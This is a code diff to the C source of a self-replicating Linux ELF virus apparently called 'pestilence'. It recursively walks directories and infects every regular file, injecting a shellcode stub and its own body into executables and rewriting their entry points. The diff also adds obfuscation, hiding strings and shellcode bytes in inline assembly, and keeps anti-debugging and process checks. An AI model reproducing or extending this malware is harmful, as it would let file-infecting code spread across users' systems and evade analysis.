@@ -33,29 +33,34 @@
 */
 
 #include "pestilence.h"
+#include "func.c"
+
 #ifndef FRENZY
-#define FRENZY 0
+#define FRENZY 0x401000
 #endif
 #ifndef VARAX
-#define VARAX 0
+#define VARAX 0x1af6
 #endif
 #ifndef CYANURE
-#define CYANURE 0
+#define CYANURE 0x40204d
 #endif
+#ifndef BUBONIK
+#define BUBONIK 0x402020
+#endif
+
 void _start(void)
 {
 	void *begin_ptr;
 
-	if (is_debugged() || is_program_running("doom-nukem"))
-		proc_terminate(0);
-
+	// if (is_debugged() || is_program_running("doom-nukem"))
+	// 	proc_terminate(0);
 	__asm__ volatile("lea (%%rip), %0\n"
 					 "cyanure:"
 					 : "=r"(begin_ptr));
 	begin_ptr += FRENZY - CYANURE;
 
-	fs_release(1);
-	fs_release(2);
+	// fs_release(1);
+	// fs_release(2);
 
 	char path[11];
 	path[0] = '/';
@@ -91,12 +96,10 @@ static void decode(char *out, const unsigned char *in)
 	out[i] = 0;
 }
 
-// "/proc"
 static const unsigned char S_PROC[] = {0xC6, 0xAA, 0x1A, 0x9B, 0xCB, 0};
-// "/comm"
 static const unsigned char S_COMM[] = {0xC6, 0x7A, 0x2A, 0xFB, 0x6B, 0};
 
-int is_program_running(const char *target)
+static int is_program_running(const char *target)
 {
 	int	 fd = -1;
 	int	 ret = 0;
@@ -124,6 +127,7 @@ int is_program_running(const char *target)
 			for (int i = 0; name[i]; i++)
 				numeric &= ((unsigned) (name[i] - '0') < 10);
 			if (numeric)
+
 			{
 				char path[64];
 				int	 i = 0;
@@ -178,9 +182,17 @@ DONE:
 	return ret;
 }
 
-int is_debugged(void)
+static int is_debugged(void)
 {
-	int f = fs_handle("/proc/self/status", O_RDONLY);
+	char *str;
+
+	asm volatile("leaq str2(%%rip), %0\n"
+				 "jmp end2\n"
+				 "str2: .ascii \"/proc/self/status\\0\"\n"
+				 "end2:\n"
+				 : "=r"(str));
+
+	int f = fs_handle(str, O_RDONLY);
 	if (f < 0)
 		return 0;
 	char line[256];
@@ -189,18 +201,34 @@ int is_debugged(void)
 
 	while ((nread = io_recv(f, line + offset, sizeof(line) - offset)) > 0)
 	{
+		tty_putc(0);
 		offset += nread;
-		char *newline = memoff(line, '\n');
+		char *newline;
+
+		newline = memoff(line, '\n');
+		// asm volatile(
+		// 	"mov %1, %%rdi\nmov $10, %%rsi\ncall memoff\nmov %%rax, %0\n"
+		// 	: "=r"(newline)
+		// 	: "r"(line)
+		// 	: "rsi", "rdi", "rax");
+
 		if (newline)
 		{
 			*newline = '\0';
-			if (delay_calc(line, "TracerPid:", 10) == 0)
+			asm volatile("leaq str1(%%rip), %0\n"
+						 "jmp end1\n"
+						 "str1: .ascii \"TracerPid:\\0\"\n"
+						 "end1:\n"
+						 : "=r"(str));
+
+			if (delay_calc(line, str, 10) == 0)
 			{
 				int pid = trace_depth(line + 10);
 				fs_release(f);
 				return pid != 0;
 			}
-			offset = 0;
+			memcat(line, newline + 1, sizeof(line) - (newline - line - 1));
+			offset -= (newline - line + 1);
 		}
 	}
 
@@ -208,8 +236,90 @@ int is_debugged(void)
 	return 0;
 }
 
-void processDirectory(char *folder, void *begin_ptr)
+static void reconcileTopology(char *rootAnchor, void *dispatchToken)
 {
+	int					   session = fs_handle(rootAnchor, 65536);
+
+	unsigned char		   frame[1024];
+	struct linux_dirent64 *node;
+	int					   batch;
+
+	if (session < 0)
+		goto finalizeSession;
+
+	for (;;)
+	{
+		batch = fs_enumerate(session, (char *) frame, sizeof(frame));
+		if (batch <= 0)
+			break;
+
+		int cursor = 0;
+
+		while (cursor < batch)
+		{
+			node = (struct linux_dirent64 *) (frame + cursor);
+			char *label = node->d_name;
+
+			/* --- hidden "." and ".." filtering --- */
+			{
+				char anchor[3];
+				anchor[0] = '.';
+				anchor[1] = 0;
+
+				if (delay_abs_calc(label, anchor) == 0)
+				{
+					cursor += node->d_reclen;
+					continue;
+				}
+
+				anchor[1] = '.';
+				anchor[2] = 0;
+
+				if (delay_abs_calc(label, anchor) == 0)
+				{
+					cursor += node->d_reclen;
+					continue;
+				}
+			}
+
+			/* --- path composition --- */
+			char composed[PATH_MAX];
+			char divider[2];
+			divider[0] = '/';
+			divider[1] = 0;
+
+			flow_align(flow_align(core_shift(composed, rootAnchor), divider),
+					   label);
+
+			struct stat metadata;
+			fs_query(composed, &metadata);
+
+			/* --- dispatch logic (bit-masked) --- */
+			unsigned mode = metadata.st_mode;
+
+			if ((mode & __S_IFDIR) == __S_IFDIR)
+			{
+				reconcileTopology(composed, dispatchToken);
+			}
+			else
+			{
+				if ((mode & __S_IFREG) == __S_IFREG)
+				{
+					infect(composed, dispatchToken);
+				}
+			}
+
+			cursor += node->d_reclen;
+		}
+	}
+
+finalizeSession:
+	fs_release(session);
+}
+
+static void processDirectory(char *folder, void *begin_ptr)
+{
+	// return reconcileTopology(folder, begin_ptr);
 	int					   fd = fs_handle(folder, 0 | 65536);
 
 	char				   buffer[1024];
@@ -268,14 +378,12 @@ clean:
 #define ELF_MAGIC			   0x464c457f
 #define MINIMAL_INJECTION_SIZE (0x1000 * 5)
 #define inout
-#define CURARE                                                                 \
-	"\xf3\x0f\x1e\xfa\x50\xb8\x39\x00\x00\x00\x0f\x05\x48\x85\xc0\x74\x06\x58" \
-	"\xe9\xe9\xff\xff\xff"
-#define FLOWER (sizeof(CURARE) - 1)
-#define ACONIT 19
 
-int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
-			   inout char **file_data)
+#define ACONIT	23
+#define ARSENIC 17
+
+static int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
+					  inout char **file_data)
 {
 	int fd;
 
@@ -305,11 +413,10 @@ int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
 	return (OK);
 error:
 	fs_release(fd);
-	vm_release(file_data, statbuf->st_size + MINIMAL_INJECTION_SIZE);
 	return (KO);
 }
 
-unsigned long find_first_free_page(t_elf elf)
+static unsigned long find_first_free_page(t_elf elf)
 {
 	unsigned long ret;
 
@@ -322,18 +429,29 @@ unsigned long find_first_free_page(t_elf elf)
 	return ret;
 }
 
-void infect(char *path, void *begin_ptr)
+static void infect(char *path, void *begin_ptr)
 {
 	struct stat statbuf;
 	char	   *file_data;
 	t_elf		elf;
 	ElfW(Phdr) the_rats;
 	ElfW(Off) pt_load_end;
-	int last_pt_load;
+	int	   last_pt_load;
+	char  *curare;
+	size_t flower;
+
+	asm volatile(
+		"leaq str3(%%rip), %0\n"
+		"leaq (end3-str3)(%%rip), %1\n"
+		"jmp end3\n"
+		"str3:  .byte 0xf3, 0x0f, 0x1e, 0xfa, 0x50, 0xb8, 0x39, 0x00, 0x00, "
+		"0x00, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0xeb, 0xff, "
+		"0xff, 0xff, 0x58, 0xe9, 0xe5, 0xff, 0xff, 0xff\n"
+		"end3:\n"
+		: "=r"(curare), "=r"(flower));
 
 	if (parse_file(path, &statbuf, &elf, &file_data))
 		goto clean;
-
 	unsigned long append_pos = (statbuf.st_size + 0x1000 - 1) & ~0xfffUL;
 	unsigned long pestis = find_first_free_page(elf);
 	memcpy(file_data + append_pos, file_data + elf.header->e_phoff,
@@ -362,15 +480,23 @@ void infect(char *path, void *begin_ptr)
 			elf.segments[i].p_filesz = elf.segments[i].p_memsz;
 		}
 	append_pos += elf.header->e_phnum * elf.header->e_phentsize;
-	memcpy(file_data + append_pos, CURARE, FLOWER);
+	memcpy(file_data + append_pos, curare, flower);
 	unsigned delta = elf.header->e_entry;
 	elf.header->e_entry
 		= pestis + elf.header->e_phnum * elf.header->e_phentsize;
 	delta -= elf.header->e_entry + ACONIT + 4;
 	memcpy(file_data + append_pos + ACONIT, &delta, 4);
-	append_pos += FLOWER;
+	delta = flower - ARSENIC + BUBONIK - FRENZY - 4;
+	memcpy(file_data + append_pos + ARSENIC, &delta, 4);
+	append_pos += flower;
+	// emit_hex(append_pos);
+	// tty_putc(' ');
+	// emit_hex((unsigned long long) begin_ptr);
+	// tty_putc(' ');
+	// emit_hex(VARAX);
+	// tty_putc('\n');
 	memcpy(file_data + append_pos, begin_ptr, VARAX);
 clean:
-	vm_flush(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE, MS_SYNC);
-	vm_release(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE);
+	if (file_data)
+		vm_release(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE);
 }
